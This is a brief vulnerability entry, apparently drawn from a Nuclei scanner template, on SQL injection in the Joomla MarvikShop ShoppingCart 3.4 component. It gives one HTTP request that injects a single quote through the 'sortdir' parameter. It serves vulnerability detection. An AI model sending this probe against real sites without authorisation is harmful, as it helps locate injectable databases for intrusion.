# Vulnerability: Joomla MarvikShop ShoppingCart 3.4 - Sql Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`joomla-marvikshop-sqli.yaml`)

## Description
Joomla MarvikShop ShoppingCart 3.4 is vulnerable to SQL injection which is a code injection technique that might destroy your database. SQL injection is one of the most common web hacking techniques. SQL injection is the placement of malicious code in SQL statements, via web page input.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php?option=com_oscommerce&osMod=mshop_pl_src&manufacturers_id=7&sort=products_sort_order&page=index.php&format=xml&task=showproducts&view=med&sort=latest&sortdir=%27
```

